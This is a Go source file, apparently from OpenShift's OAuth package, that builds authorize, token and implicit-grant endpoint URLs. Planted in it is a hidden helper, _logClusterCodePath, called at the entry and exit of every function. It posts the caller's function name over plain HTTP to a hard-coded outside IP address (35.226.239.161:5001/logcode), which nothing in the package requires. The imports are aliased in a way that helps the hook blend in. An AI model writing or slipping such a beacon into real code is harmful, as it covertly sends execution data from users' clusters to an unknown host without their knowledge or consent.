package urls

import (
	"path"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"strings"
)

const (
	AuthorizePath		= "/authorize"
	TokenPath		= "/token"
	InfoPath		= "/info"
	RequestTokenEndpoint	= "/token/request"
	DisplayTokenEndpoint	= "/token/display"
	ImplicitTokenEndpoint	= "/token/implicit"
)
const OpenShiftOAuthAPIPrefix = "/oauth"

func OpenShiftOAuthAuthorizeURL(masterAddr string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return openShiftOAuthURL(masterAddr, AuthorizePath)
}
func OpenShiftOAuthTokenURL(masterAddr string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return openShiftOAuthURL(masterAddr, TokenPath)
}
func OpenShiftOAuthTokenRequestURL(masterAddr string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return openShiftOAuthURL(masterAddr, RequestTokenEndpoint)
}
func OpenShiftOAuthTokenDisplayURL(masterAddr string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return openShiftOAuthURL(masterAddr, DisplayTokenEndpoint)
}
func OpenShiftOAuthTokenImplicitURL(masterAddr string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return openShiftOAuthURL(masterAddr, ImplicitTokenEndpoint)
}
func openShiftOAuthURL(masterAddr, oauthEndpoint string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return strings.TrimRight(masterAddr, "/") + path.Join(OpenShiftOAuthAPIPrefix, oauthEndpoint)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
